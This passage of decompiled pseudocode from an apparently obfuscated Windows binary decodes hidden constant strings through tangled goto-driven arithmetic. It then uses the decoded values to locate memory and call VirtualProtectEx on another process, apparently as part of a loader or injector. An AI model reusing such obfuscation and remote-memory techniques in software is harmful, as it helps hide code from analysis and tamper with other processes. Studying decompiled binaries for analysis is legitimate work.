      bVar21 = ('\x17' - (cVar6 + 0x23U & bVar7)) * '\x02' + bVar7 + cVar6;
LAB_14001e4f0:
      uVar25 = uVar17 + 2;
      uVar19 = uVar20 + uVar17;
      if (uVar19 <= uVar23) {
        if (uVar20 < uVar16) {
          bVar21 = bVar7 + (cVar6 + 0x57U & bVar7) * -2 + -10 + cVar6;
LAB_14001e5d7:
          if (uVar19 == 0x10) {
            bVar21 = (cVar6 + (cVar6 + 6U & bVar7) * -2) - 0x24;
LAB_14001e9da:
            bVar11 = cVar6 + 0x5dU + (cVar6 + 0x5dU & bVar7) * -2 + 'u' + bVar7;
            local_448[uVar23 - 0x40] = bVar11;
            uVar17 = uVar17 + 1;
            uVar23 = uVar23 - (bVar11 + uVar17);
            goto LAB_14001ea1b;
          }
          if (uVar20 <= uVar17 + 0x10) {
            if (uVar20 == uVar16) {
              cVar22 = bVar7 + (cVar6 + 0x69U & bVar7) * -2 + -0x76;
              goto LAB_14001e996;
            }
            if (uVar20 == uVar25) {
              bVar21 = ('1' - (cVar6 - 0x3bU & bVar7)) * '\x02' + bVar7 + cVar6;
            }
            else {
              if (uVar20 == uVar17 + 5) {
                bVar21 = ('\x13' - (cVar6 - 0x31U & bVar7)) * '\x02' + bVar7 + cVar6;
                goto LAB_14001e944;
              }
              if (uVar20 == uVar17 + 3) {
                bVar21 = ('\t' - (cVar6 + 0x7dU & bVar7)) * '\x02' + bVar7 + cVar6;
                goto LAB_14001e9da;
              }
              if (uVar20 != uVar17 + 8) goto LAB_14001e604;
              bVar21 = (cVar6 + bVar7 + (cVar6 - 0x27U & bVar7) * -2) - 0x16;
              uVar23 = uVar23 + (byte)local_448[uVar23 - 0x40] + uVar17 + 1;
            }
            goto LAB_14001e423;
          }
          bVar21 = bVar7 + (cVar6 + 0xbbU & bVar7) * -2 + -0x62 + cVar6;
LAB_14001e604:
          if (uVar20 < 0x10) {
            if (uVar17 + 0x10 < uVar20) {
              bVar21 = bVar7 + (cVar6 - 0x22U & bVar7) * -2 + -0x34 + cVar6;
            }
            else {
              if (uVar20 == uVar16) {
                bVar21 = cVar6 + bVar7 + (cVar6 + 0x8cU & bVar7) * -2 + 0xb8;
                uVar23 = uVar23 + (byte)local_448[uVar23 - 0x40] + uVar17 + 1;
                goto LAB_14001e423;
              }
              if (uVar20 == uVar25) {
                bVar21 = bVar7 + (cVar6 - 0x18U & bVar7) * -2 + -0x70 + cVar6;
                goto LAB_14001e9da;
              }
              if (uVar20 == uVar17 + 5) {
                bVar21 = ('4' - (cVar6 + 0x44U & bVar7)) * '\x02' + bVar7 + cVar6;
                uVar20 = uVar19;
                goto LAB_14001e944;
              }
              if (uVar20 == uVar17 + 3) {
                bVar21 = (' ' - (cVar6 + 0xa0U & bVar7)) * '\x02' + bVar7 + cVar6;
                goto LAB_14001e423;
              }
              if (uVar20 == uVar17 + 8) {
                bVar21 = cVar6 - 4;
                cVar22 = '\f';
                goto LAB_14001e98b;
              }
            }
            if (0x3ff < uVar17) {
              bVar21 = (('\x02' - (cVar6 + 0xaaU & bVar7)) * '\x02' + bVar7 + cVar6) * '\x02';
              goto LAB_14001e999;
            }
            local_448[uVar23 - 0x40] = bVar21;
            uVar23 = uVar23 + 1;
            goto LAB_14001e423;
          }
          cVar22 = bVar7 * '\x02' + (cVar6 + 0x58U & bVar7) * -2 + -0x10;
        }
        else {
          if (uVar20 == uVar16) {
            bVar21 = ('.' - (cVar6 + 0x46U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar23 + (byte)local_448[uVar23 - 0x40] + uVar17 + 1;
            goto LAB_14001e423;
          }
          if (uVar20 == uVar25) {
            bVar21 = ('$' - (cVar6 - 0xcU & bVar7)) * '\x02' + bVar7 + cVar6;
            goto LAB_14001ea1b;
          }
          if (uVar20 == uVar25) {
            bVar21 = ('\x1a' - (cVar6 + 0xa2U & bVar7)) * '\x02' + bVar7 + cVar6;
            goto LAB_14001e9da;
          }
          if (uVar20 != uVar17 + 5) {
            if (uVar20 != uVar17 + 3) {
              if (uVar20 != uVar17 + 8) goto LAB_14001e5d7;
              cVar22 = bVar7 + (cVar6 + 0xb6U & bVar7) * -2 + -0x44;
              goto LAB_14001e996;
            }
            bVar21 = (cVar6 + bVar7 + (cVar6 + 0x5aU & bVar7) * -2) - 0x1c;
            goto LAB_14001e423;
          }
          cVar22 = bVar7 + (cVar6 + 0xacU & bVar7) * -2 + -8;
        }
        bVar21 = cVar22 + cVar6;
        local_448[uVar23 - 0x40] =
             cVar6 + 0xafU + (cVar6 + 0xafU & bVar7) * -2 + '7' + bVar21 + bVar7;
        uVar20 = uVar19;
        goto LAB_14001e944;
      }
      while( true ) {
        uVar16 = uVar17 + 0x400;
        if (uVar20 == uVar16) {
          cVar22 = bVar7 + (cVar6 + 0x62U & bVar7) * -2 + -0x4c;
          goto LAB_14001e996;
        }
        if (uVar16 < uVar17 + 0xc00) {
          bVar21 = (cVar6 + bVar7 + (cVar6 + 0x85U & bVar7) * -2) - 0x1e;
          goto LAB_14001e407;
        }
        uVar20 = uVar17 + 0x803;
        if (uVar16 < uVar20) break;
        uVar16 = uVar17 + 0x809;
        if (uVar16 < uVar20) {
          bVar21 = ('\b' - (cVar6 + 0xa8U & bVar7)) * '\x02' + bVar7 + cVar6;
          uVar23 = uVar23 + (ulonglong)(byte)local_448[uVar23 - 0x40] + uVar17 + 0x806 + 1;
          uVar17 = uVar17 + 0x806;
          goto LAB_14001e423;
        }
        uVar17 = uVar17 + 0x80c;
        uVar20 = uVar16;
      }
      bVar21 = bVar7 + (cVar6 - 0x1fU & bVar7) * -2 + -0x46 + cVar6;
      uVar17 = uVar17 + 0x800;
      uVar20 = uVar16;
    }
  }
  else {
    in_stack_0105b243 = CONCAT44(uStack_484,local_488);
  }
  FUN_1400393b0(&local_68,in_stack_0105b243,lpBaseAddress);
  local_468 = 0xe7efedd3;
  local_464 = 0xebd9ece6;
  local_460 = 0x4de5;
  local_45e = 0;
  local_45a = 0;
  local_458 = 0;
  bVar21 = local_5c8;
LAB_14001eb10:
  uVar17 = DAT_140a618c8;
  uVar20 = DAT_140a618d0;
LAB_14001eb20:
  uVar23 = (ulonglong)bVar21;
  uVar16 = 0;
LAB_14001eb23:
  bVar21 = (byte)uVar23;
  if (uVar16 < 0x11) {
    bVar7 = local_448[uVar16 - 0x20];
    if (uVar16 < uVar17) {
      puVar14 = (undefined4 *)(auStackY_5f8 + 0x152e821);
      goto LAB_14001f330;
    }
    cVar6 = (char)uVar16;
    if (uVar20 + 1 <= uVar17) {
      if (uVar17 == uVar20 + 1) {
        uVar23 = (ulonglong)(byte)((bVar7 + (cVar6 - 0x21U) + (cVar6 - 0x21U & bVar7) * -2) - 0x19);
        uVar16 = uVar16 + (byte)local_448[uVar16 - 0x20] + uVar20 + 1;
      }
      else {
        if (uVar17 == uVar20 + 2) {
          uVar23 = (ulonglong)(byte)(bVar7 + (bVar7 & cVar6 + 0xb3U) * -2 + '\x1b' + cVar6 + 0xb3U);
          goto LAB_14001f243;
        }
        if (uVar17 != uVar20 + 3) {
          if (uVar17 == uVar20 + 2) {
            bVar21 = cVar6 + 0x45;
            cVar22 = '1';
            goto LAB_14001f1dc;
          }
          if (uVar17 != uVar20 + 7) goto LAB_14001eb9b;
          cVar22 = bVar7 + (cVar6 + 0x2fU & bVar7) * -2 + -0x1a;
          goto LAB_14001f1a5;
        }
        uVar23 = (ulonglong)(byte)(cVar6 + 0x87U + bVar7 + (bVar7 & cVar6 + 0x87U) * -2 + 0x4f);
LAB_14001f20e:
        uVar17 = uVar17 + uVar20;
LAB_14001f211:
        uVar16 = uVar16 - uVar23;
      }
      goto LAB_14001eb23;
    }
    bVar21 = bVar7 + (bVar7 & cVar6 - 0xbU) * -2 + 'M' + (cVar6 - 0xbU);
LAB_14001eb9b:
    if (uVar16 < uVar20) {
      puVar14 = (undefined4 *)(auStackY_5f8 + 0x14c822c);
      goto LAB_14001f330;
    }
    uVar23 = uVar20 + 1;
    if (uVar17 < uVar20 + 9) {
      bVar21 = ('5' - (cVar6 + 0x19U & bVar7)) * '\x02' + bVar7 + cVar6;
LAB_14001ec10:
      if (uVar16 < uVar20 + uVar17) {
        while( true ) {
          uVar25 = uVar20;
          uVar20 = uVar25;
          if (uVar17 == uVar25 + 0x2a) break;
          if (uVar17 == uVar25 + 9) {
            uVar23 = (ulonglong)(byte)((cVar6 + bVar7 + (cVar6 + 0x30U & bVar7) * -2) - 0x20);
            uVar20 = uVar25 + 1;
            goto LAB_14001eb23;
          }
          if (uVar17 == uVar25 + 0x80) {
            uVar23 = (ulonglong)(byte)(('6' - (cVar6 - 0x12U & bVar7)) * '\x02' + bVar7 + cVar6);
            goto LAB_14001f20e;
          }
          if (uVar17 == uVar25 + 0x5a) {
            uVar23 = (ulonglong)(byte)(bVar7 + (cVar6 + 0xacU & bVar7) * -2 + -8 + cVar6);
            goto LAB_14001f270;
          }
          uVar17 = uVar25 + 0x1000;
          uVar20 = uVar25 + 0x1008;
          if (uVar17 < uVar25 + 0x100b) {
            bVar21 = (cVar6 + bVar7 + (cVar6 + 0x5fU & bVar7) * -2) - 0x3a;
            goto LAB_14001eb10;
          }
          if (uVar17 < uVar25 + 0x1028) {
            bVar21 = ('%' - (cVar6 + 0x49U & bVar7)) * '\x02' + bVar7 + cVar6;
            goto LAB_14001eb20;
          }
          if (uVar17 < uVar25 + 0x1408) {
            bVar21 = (cVar6 + bVar7 + (cVar6 - 0x25U & bVar7) * -2) - 0x22;
            goto LAB_14001ed62;
          }
          if (uVar25 + 0x100a <= uVar17) {
            uVar17 = uVar25 + 0x1049;
            uVar20 = uVar25 + 0x1449;
            if (uVar25 + 0x144f < uVar17) {
              uVar23 = (ulonglong)
                       (byte)(('\x18' - (cVar6 + 0x78U & bVar7)) * '\x02' + bVar7 + cVar6);
              uVar16 = uVar16 + (byte)local_448[uVar16 - 0x20] + uVar20 + 1;
              goto LAB_14001eb23;
            }
            if (uVar25 + 0x148a < uVar17) {
              uVar23 = (ulonglong)(byte)(bVar7 + (cVar6 + 0x62U & bVar7) * -2 + -0x4c + cVar6);
              goto LAB_14001f270;
            }
            if (uVar25 + 0x148b < uVar17) {
              cVar22 = bVar7 + (cVar6 + 10U & bVar7) * -2 + -0x3c;
              goto LAB_14001f0c0;
            }
            if (uVar25 + 0x14c3 < uVar17) {
              cVar22 = ('(' - (cVar6 - 0x38U & bVar7)) * '\x02' + bVar7;
              goto LAB_14001f1a5;
            }
            uVar17 = uVar25 + 0x144a;
            uVar20 = uVar25 + 0x14c4;
          }
        }
        cVar22 = ('.' - (cVar6 + 0x46U & bVar7)) * '\x02' + bVar7;
        goto LAB_14001f1a5;
      }
      if (uVar20 + 0x5a <= uVar17) {
        if (uVar17 != uVar23) {
          if (uVar17 == uVar20 + 2) {
            uVar23 = (ulonglong)(byte)((',' - (cVar6 + 0x1cU & bVar7)) * '\x02' + bVar7 + cVar6);
            goto LAB_14001f270;
          }
          if (uVar17 == uVar20 + 3) {
            uVar23 = (ulonglong)(byte)(bVar7 + (cVar6 + 6U & bVar7) * -2 + -0x24 + cVar6);
            goto LAB_14001f243;
          }
          if (uVar17 != uVar20 + 4) {
            if (uVar17 != uVar20 + 5) goto LAB_14001ee51;
            cVar22 = ('4' - (cVar6 - 0x3cU & bVar7)) * '\x02';
            goto LAB_14001f0bd;
          }
          uVar23 = (ulonglong)(byte)(('0' - (cVar6 - 0x10U & bVar7)) * '\x02' + bVar7 + cVar6);
          goto LAB_14001f211;
        }
        uVar23 = (ulonglong)(byte)((cVar6 + bVar7 + (cVar6 + 0x32U & bVar7) * -2) - 0x2c);
        uVar16 = uVar16 + (byte)local_448[uVar16 - 0x20] + uVar20 + 1;
        goto LAB_14001eb23;
      }
      bVar21 = ('!' - (cVar6 - 0xbU & bVar7)) * '\x02' + bVar7 + cVar6;
LAB_14001ee51:
      if (uVar20 + uVar17 == 0x400) {
        uVar23 = (ulonglong)(byte)(('*' - (cVar6 + 0x72U & bVar7)) * '\x02' + cVar6);
LAB_14001f243:
        bVar21 = bVar7 + (bVar7 & cVar6 + 0x67U) * -2 + '/' + cVar6 + 0x67U;
        local_448[uVar16 - 0x20] = bVar21;
        uVar16 = uVar16 - ((ulonglong)bVar21 + uVar20 + 1);
        uVar20 = uVar20 + 1;
LAB_14001f270:
        bVar21 = (char)uVar16 + 0x5c;
        local_448[uVar16 - 0x20] = ('>' - (bVar21 & bVar7)) * '\x02' + bVar21 + bVar7;
        uVar17 = uVar17 + 1;
        lVar24 = uVar16 + (-1 - uVar17);
        uVar16 = lVar24 + (byte)local_448[lVar24 + -0x20] + uVar20 + 1;
        goto LAB_14001eb23;
      }
      if (uVar17 <= uVar20 + 6) {
        if (uVar17 == uVar23) {
          cVar22 = ('\x1f' - (cVar6 + 0x4bU & bVar7)) * '\x02' + bVar7;
          goto LAB_14001f1a5;
        }
        if (uVar17 != uVar20 + 3) {
          if (uVar17 == uVar20 + 2) {
            uVar23 = (ulonglong)(byte)(('\'' - (cVar6 - 0xdU & bVar7)) * '\x02' + bVar7 + cVar6);
            goto LAB_14001f20e;
          }
          if (uVar17 == uVar20 + 4) {
            uVar23 = (ulonglong)(byte)(('+' - (cVar6 - 0x39U & bVar7)) * '\x02' + bVar7 + cVar6);
            goto LAB_14001f243;
          }
          goto LAB_14001ed62;
        }
        cVar22 = bVar7 + (cVar6 + 9U & bVar7) * -2 + -0x36;
LAB_14001f0c0:
        uVar23 = (ulonglong)(byte)(cVar22 + cVar6);
        local_448[uVar16 - 0x20] =
             bVar7 + (bVar7 & cVar6 + 0x7dU) * -2 + -0x6b + cVar22 + cVar6 + cVar6 + 0x7dU;
        goto LAB_14001f20e;
      }
      bVar21 = cVar6 + bVar7 + (cVar6 + 0x61U & bVar7) * -2 + 0xba;
LAB_14001ed62:
      if (0x79 < uVar17) {
        cVar22 = bVar7 + (cVar6 + 0x88U & bVar7) * -2 + -0x30;
LAB_14001f0bd:
        cVar22 = cVar22 + bVar7;
        goto LAB_14001f0c0;
      }
      if (uVar20 + 1000 < uVar17) {
        bVar21 = ('\x12' - (cVar6 + 0x7aU & bVar7)) * '\x02' + bVar7 + cVar6;
      }
      else {
        if (uVar17 == uVar20 + 1) {
          uVar23 = (ulonglong)(byte)(cVar6 + bVar7 + (cVar6 + 100U & bVar7) * -2 + 0xa8);
          uVar16 = uVar16 + (byte)local_448[uVar16 - 0x20] + uVar20 + 1;
          goto LAB_14001eb23;
        }
        if (uVar17 == uVar20 + 2) {
          uVar23 = (ulonglong)(byte)(bVar7 + (cVar6 + 0x38U & bVar7) * -2 + -0x50 + cVar6);
          goto LAB_14001f243;
        }
        if (uVar17 == uVar20 + 3) {
          uVar23 = (ulonglong)(byte)(('\x1a' - (cVar6 + 0x22U & bVar7)) * '\x02' + bVar7 + cVar6);
          goto LAB_14001f211;
        }
        if (uVar17 == uVar20 + 5) {
          cVar22 = ('\x1e' - (cVar6 - 10U & bVar7)) * '\x02';
          goto LAB_14001f0bd;
        }
        if (uVar17 == uVar20 + 9) {
          cVar22 = bVar7 + (cVar6 + 0xb4U & bVar7) * -2 + -0x38;
          goto LAB_14001f1a5;
        }
      }
      if (uVar20 < 0x2a) {
        local_448[uVar16 - 0x20] = bVar21;
        uVar23 = (ulonglong)bVar21;
        uVar16 = uVar16 + 1;
        goto LAB_14001eb23;
      }
      uVar23 = (ulonglong)((uint)(byte)(bVar7 + (cVar6 + 0x9eU & bVar7) * -2 + cVar6) * 2 - 0x68);
    }
    else {
      if (uVar17 != uVar23) {
        if (uVar17 == uVar20 + 2) {
          bVar21 = cVar6 - 0x13;
          cVar22 = '9';
LAB_14001f1dc:
          uVar23 = (ulonglong)(byte)((cVar22 - (bVar21 & bVar7)) * '\x02' + bVar7 + cVar6);
          uVar20 = uVar20 + 1;
        }
        else if (uVar17 == uVar20 + 3) {
          uVar23 = (ulonglong)(byte)((cVar6 + bVar7 + (cVar6 - 0x29U & bVar7) * -2) - 10);
        }
        else {
          if (uVar17 == uVar20 + 4) {
            uVar23 = (ulonglong)(byte)((cVar6 + bVar7 + (cVar6 + 0xabU & bVar7) * -2) - 2);
            goto LAB_14001f20e;
          }
          if (uVar17 != uVar20 + 9) goto LAB_14001ec10;
          uVar23 = (ulonglong)(byte)(('\a' - (cVar6 + 0x53U & bVar7)) * '\x02' + bVar7 + cVar6);
          uVar16 = uVar16 + (byte)local_448[uVar16 - 0x20] + uVar20 + 1;
        }
        goto LAB_14001eb23;
      }
      cVar22 = bVar7 + (cVar6 + 3U & bVar7) * -2 + -0x12;
LAB_14001f1a5:
      uVar23 = (ulonglong)(byte)(cVar22 + cVar6);
    }
    local_448[uVar16 - 0x20] = bVar7 + (bVar7 & cVar6 + 0x93U) * -2 + -5 + cVar6 + 0x93U;
    uVar20 = uVar20 + 1;
    goto LAB_14001eb23;
  }
  puVar14 = &local_468;
LAB_14001f330:
  FUN_140023550(local_448,puVar14);
  FUN_140037e90(&local_78,local_1b8,local_448,0x40);
  FUN_140025000(local_448);
  if (local_198 != (LPVOID)0x0) goto LAB_1400215dc;
  local_428 = 0x3e26223f;
  local_424 = 0x33622e3e;
  local_420 = 0x393a;
  local_41e = 0xac;
  local_41d = 0;
  uStack_415 = 0;
  local_40d = 0;
  bVar21 = local_5c8;
LAB_14001f3d0:
  uVar20 = DAT_140a618c8;
  uVar17 = DAT_140a618d0;
LAB_14001f3e0:
  uVar25 = 0;
  uVar23 = uVar20;
  uVar16 = uVar17;
LAB_14001f3e3:
  if (0x1b < uVar25) {
    puVar14 = &local_428;
LAB_14001ff09:
    FUN_140023550(local_408,puVar14);
    lVar24 = FUN_14000fa30(param_1,local_368,local_408,0);
    if (*(char *)(lVar24 + 0x30) == '\0') {
                    /* WARNING: Subroutine does not return */
      FUN_14000f120();
    }
    FUN_140023480(local_1b8,lVar24);
    local_198 = *(LPVOID *)(lVar24 + 0x20);
    local_190 = *(undefined8 *)(lVar24 + 0x28);
    FUN_14000fbd0(local_368);
    FUN_140025000(local_408);
    local_3e8 = -0x747b4a7a;
    local_3e4 = 0;
    local_3dc = 0;
    local_3d8 = 0;
    bVar21 = local_5c8;
LAB_14001ffb0:
    uVar20 = DAT_140a618c8;
    uVar17 = DAT_140a618d0;
LAB_14001ffc0:
    uVar16 = 0;
    uVar23 = uVar17;
LAB_14001ffc3:
    if (0x11 < uVar16) {
      in_stack_00e3ff49 = local_3e8;
LAB_140020ac8:
      local_198 = (LPVOID)((longlong)local_198 + (longlong)in_stack_00e3ff49);
      local_3c8 = 0x9b9a9958;
      local_3c4 = 0;
      uStack_3bc = 0;
      local_3b4 = 0;
      bVar21 = local_5c8;
LAB_140020b10:
      uVar20 = DAT_140a618c8;
      uVar17 = DAT_140a618d0;
LAB_140020b20:
      uVar16 = 0;
      uVar23 = uVar17;
LAB_140020b23:
      if (0x15 < uVar16) {
        in_stack_00935bb4 = local_3c8;
LAB_1400215a6:
        VirtualProtectEx(*(HANDLE *)(*(longlong *)(param_1 + 0x58) + 0x30),local_198,
                         lStack_60 - (longlong)local_68,in_stack_00935bb4,(PDWORD)&DAT_140a61968);
        goto LAB_1400215dc;
      }
      bVar7 = local_368[uVar16 - 0x60];
      cVar6 = (char)uVar16;
LAB_140020b40:
      if (uVar16 < uVar20) goto LAB_1400215a6;
      if (uVar23 + 1 <= uVar20) {
        if (uVar20 == uVar23 + 1) {
          bVar21 = (cVar6 - 0x3cU) + bVar7 + (bVar7 & cVar6 - 0x3cU) * -2 + 0xa4;
          uVar16 = uVar16 + (byte)local_368[uVar16 - 0x60] + uVar23 + 1;
        }
        else {
          if (uVar20 == uVar23 + 2) {
            bVar21 = (bVar7 + cVar6 + 0x74U + (cVar6 + 0x74U & bVar7) * -2) - 0x2c;
            goto LAB_1400214c2;
          }
          if (uVar20 == uVar23 + 4) {
            cVar6 = ('\x02' - (cVar6 + 0x24U & bVar7)) * '\x02' + cVar6 + 0x24U;
            goto LAB_14002148f;
          }
          if (uVar20 == uVar23 + 5) {
            bVar21 = ('\x0e' - (bVar7 & cVar6 - 4U)) * '\x02' + bVar7 + (cVar6 - 4U);
            goto LAB_140021455;
          }
          if (uVar20 != uVar23 + 3) goto LAB_140020bb0;
          bVar21 = cVar6 + (cVar6 + 0xacU & bVar7) * -2 + -8 + bVar7;
          uVar23 = uVar23 + 1;
        }
        goto LAB_140020b23;
      }
      bVar21 = bVar7 + (bVar7 & cVar6 - 0x14U) * -2 + -0x74 + (cVar6 - 0x14U);
LAB_140020bb0:
      if (uVar16 < uVar23) {
        in_stack_00935bb4 = in_stack_015d9ac8;
        goto LAB_1400215a6;
      }
      if (uVar23 + 6 <= uVar20) {
        if (uVar20 == uVar23 + 1) {
          cVar22 = cVar6 + (cVar6 + 0x34U & bVar7) * -2 + -0x38;
          goto LAB_1400213e4;
        }
        if (uVar20 != uVar23 + 2) {
          if (uVar20 != uVar23 + 3) {
            if (uVar20 != uVar23 + 6) goto LAB_140020c10;
            bVar21 = (',' - (cVar6 + 0x1cU & bVar7)) * '\x02' + cVar6 + bVar7;
            goto LAB_1400214e9;
          }
          bVar21 = bVar7 + cVar6 + (cVar6 + 0x94U & bVar7) * -2 + 0x88;
          goto LAB_140021492;
        }
        bVar21 = bVar7 + cVar6 + (cVar6 - 0x1cU & bVar7) * -2 + 0xa8;
        goto LAB_140020b23;
      }
      bVar21 = bVar7 + (cVar6 + 0x5cU & bVar7) * -2 + -0x28 + cVar6;
LAB_140020c10:
      while( true ) {
        uVar17 = uVar23;
        if (uVar20 + uVar23 <= uVar16) break;
        while( true ) {
          do {
            uVar23 = uVar17;
            if (uVar20 == uVar23 + 3) {
              cVar22 = cVar6 + (cVar6 + 0x68U & bVar7) * -2 + -0x70;
              goto LAB_1400213e4;
            }
            if (uVar20 == uVar23 + 6) {
              bVar21 = bVar7 + cVar6 + (cVar6 + 0x40U & bVar7) * -2 + 0x80;
              uVar23 = uVar23 + 1;
              goto LAB_140020b23;
            }
            if (uVar20 == uVar23 + 10) {
              bVar21 = ('8' - (cVar6 + 0x18U & bVar7)) * '\x02' + cVar6 + bVar7;
              goto LAB_140020b23;
            }
            if (uVar20 == uVar23 + 0x28) {
              bVar21 = ('0' - (cVar6 - 0x10U & bVar7)) * '\x02' + cVar6 + bVar7;
              goto LAB_140021455;
            }
            if (uVar20 == uVar23 + 100) {
              cVar6 = ('(' - (cVar6 - 0x38U & bVar7)) * '\x02' + cVar6;
              goto LAB_14002148f;
            }
            if (uVar20 == uVar23 + 1000) {
              bVar21 = (' ' - (cVar6 + 0xa0U & bVar7)) * '\x02' + cVar6 + bVar7;
              goto LAB_140021495;
            }
            if (uVar20 == uVar23 + 0x61) {
              bVar21 = ('\x18' - (cVar6 + 0x78U & bVar7)) * '\x02' + cVar6 + bVar7;
              goto LAB_1400214c2;
            }
            if (uVar20 == uVar23 + 0x5a) {
              bVar21 = ('\x10' - (cVar6 + 0x50U & bVar7)) * '\x02' + cVar6 + bVar7;
              goto LAB_1400214e9;
            }
            if (uVar20 == uVar23 + 2) {
              bVar21 = ('\b' - (cVar6 + 0x28U & bVar7)) * '\x02' + cVar6 + bVar7;
              uVar16 = uVar16 + (byte)local_368[uVar16 - 0x60] + uVar23 + 1;
              goto LAB_140020b23;
            }
            uVar17 = uVar23;
          } while (uVar20 == uVar23 + 5);
          uVar20 = uVar23 + 0x20;
          uVar17 = uVar23 + 0x29;
          if (uVar20 < uVar23 + 0x6b) {
            bVar21 = ('4' - (cVar6 - 0x3cU & bVar7)) * '\x02' + cVar6 + bVar7;
            goto LAB_140020b10;
          }
          if (uVar20 < uVar23 + 0x229) {
            bVar21 = (',' - (cVar6 + 0x9cU & bVar7)) * '\x02' + cVar6 + bVar7;
            goto LAB_140020b20;
          }
          if (uVar20 < uVar23 + 0x1029) {
            bVar21 = ('$' - (cVar6 + 0x74U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar17;
            goto LAB_140020b40;
          }
          if (uVar20 < uVar23 + 0x6a) {
            bVar21 = ('\x1c' - (cVar6 + 0x4cU & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar17;
            goto LAB_140020bb0;
          }
          if (uVar20 < uVar23 + 0x2a) break;
          if (uVar20 < uVar23 + 0x2d) {
            bVar21 = cVar6 - 4;
            cVar22 = '\f';
            uVar23 = uVar17;
            goto LAB_140020fe2;
          }
          if (uVar20 < uVar23 + 0x31) {
            cVar22 = ('\x04' - (cVar6 - 0x2cU & bVar7)) * '\x02' + cVar6;
            uVar23 = uVar17;
            goto LAB_140020fa7;
          }
          if (uVar20 < uVar23 + 0x39) {
            cVar22 = cVar6 + (cVar6 + 0xacU & bVar7) * -2 + -8;
            uVar23 = uVar17;
            goto LAB_140020f6a;
          }
          uVar25 = uVar23 + 0x69;
          if (uVar20 < uVar25) {
            bVar21 = (bVar7 + cVar6 + (cVar6 + 0x84U & bVar7) * -2) - 0x18;
            uVar23 = uVar17;
            goto LAB_140020f47;
          }
          if (uVar23 + 0xa9 <= uVar20) {
            uVar17 = uVar23 + 0x469;
            uVar20 = uVar25;
            if (uVar23 + 0x4e9 < uVar25) {
              bVar21 = (' ' - (cVar6 + 0x20U & bVar7)) * '\x02' + cVar6 + bVar7;
              uVar16 = uVar16 + (byte)local_368[uVar16 - 0x60] + uVar17 + 1;
              uVar23 = uVar17;
              goto LAB_140020b23;
            }
            if (uVar23 + 0x869 < uVar25) {
              bVar21 = ('\x18' - (cVar6 - 8U & bVar7)) * '\x02' + cVar6 + bVar7;
              uVar23 = uVar17;
              goto LAB_1400214e9;
            }
            if (uVar23 + 0x4e3 < uVar25) {
              bVar21 = ('\x10' - (cVar6 - 0x30U & bVar7)) * '\x02' + cVar6 + bVar7;
              uVar23 = uVar17;
              goto LAB_1400214c2;
            }
            if (uVar23 + 0x473 < uVar25) {
              bVar21 = ('\b' - (cVar6 + 0xa8U & bVar7)) * '\x02' + cVar6 + bVar7;
              uVar23 = uVar17;
              goto LAB_140021495;
            }
            if (uVar23 + 0x491 < uVar25) {
              bVar21 = bVar7 + cVar6 + (cVar6 + 0x80U & bVar7) * -2;
              uVar23 = uVar17;
              goto LAB_140021492;
            }
            if (uVar23 + 0x4cd < uVar25) {
              bVar21 = cVar6 + (cVar6 + 0x58U & bVar7) * -2 + -0x10 + bVar7;
              uVar23 = uVar17;
              goto LAB_140021455;
            }
            if (uVar23 + 0x851 < uVar25) {
              bVar21 = (bVar7 + cVar6 + (cVar6 + 0x30U & bVar7) * -2) - 0x20;
              uVar23 = uVar17;
              goto LAB_140020b23;
            }
            if (uVar23 + 0x4ca < uVar25) {
              bVar21 = (bVar7 + cVar6 + (cVar6 + 8U & bVar7) * -2) - 0x30;
              uVar23 = uVar23 + 0x46a;
              goto LAB_140020b23;
            }
            if (uVar23 + 0x4c3 < uVar25) {
              cVar22 = cVar6 + (cVar6 - 0x20U & bVar7) * -2 + -0x40;
              uVar23 = uVar17;
              goto LAB_1400213e4;
            }
            if (uVar25 <= uVar23 + 0x46b) {
              uVar20 = uVar23 + 0x4c3;
              uVar17 = uVar23 + 0x4c8;
            }
          }
        }
        bVar21 = ('\x14' - (cVar6 + 0x24U & bVar7)) * '\x02' + bVar7 + cVar6;
        uVar23 = uVar17;
      }
      if (uVar20 < uVar23 + 0x20) {
        bVar21 = cVar6 - 0x14;
        cVar22 = '<';
LAB_140020fe2:
        bVar21 = (cVar22 - (bVar21 & bVar7)) * '\x02' + cVar6 + bVar7;
LAB_140020fee:
        if (uVar20 + uVar23 != 0x400) {
          if (uVar23 + 0x80 < uVar20) {
            cVar22 = cVar6 + (cVar6 + 0x3cU & bVar7) * -2 + -0x68;
LAB_140020fa7:
            bVar21 = cVar22 + bVar7;
          }
          else {
            if (uVar20 == uVar23 + 1) {
              cVar22 = cVar6 + (cVar6 + 0x14U & bVar7) * -2 + -0x78;
LAB_1400213e4:
              bVar21 = cVar22 + bVar7;
              goto LAB_1400213e7;
            }
            if (uVar20 == uVar23 + 2) {
              bVar21 = ('4' - (cVar6 - 0x3cU & bVar7)) * '\x02' + cVar6 + bVar7;
              goto LAB_140020b23;
            }
            if (uVar20 == uVar23 + 5) {
              bVar21 = ('\x1c' - (cVar6 + 0x4cU & bVar7)) * '\x02' + cVar6 + bVar7;
              goto LAB_140021495;
            }
            if (uVar20 == uVar23 + 7) {
              bVar21 = ('\x14' - (cVar6 + 0x24U & bVar7)) * '\x02' + cVar6 + bVar7;
              goto LAB_1400214c2;
            }
            if (uVar20 == uVar23 + 3) {
              bVar21 = ('\f' - (cVar6 - 4U & bVar7)) * '\x02' + cVar6 + bVar7;
              goto LAB_1400214e9;
            }
          }
          if (uVar20 < 5) {
            if (uVar23 + 2 < uVar20) {
              cVar22 = ('8' - (cVar6 + 0x98U & bVar7)) * '\x02' + cVar6;
LAB_140020f6a:
              bVar21 = cVar22 + bVar7;
            }
            else {
              if (uVar20 == uVar23 + 1) {
                bVar21 = ('0' - (cVar6 + 0x70U & bVar7)) * '\x02' + cVar6 + bVar7;
                uVar16 = uVar16 + (byte)local_368[uVar16 - 0x60] + uVar23 + 1;
                goto LAB_140020b23;
              }
              if (uVar20 == uVar23 + 2) {
                bVar21 = ('(' - (cVar6 + 0x48U & bVar7)) * '\x02' + cVar6 + bVar7;
                goto LAB_1400214e9;
              }
              if (uVar20 == uVar23 + 3) {
                bVar21 = (' ' - (cVar6 + 0x20U & bVar7)) * '\x02' + cVar6 + bVar7;
                goto LAB_1400214c2;
              }
              if (uVar20 == uVar23 + 5) {
                bVar21 = ('\b' - (cVar6 + 0xa8U & bVar7)) * '\x02' + cVar6 + bVar7;
                goto LAB_140021455;
              }
            }
            if (uVar23 < 0x80) {
LAB_140020f47:
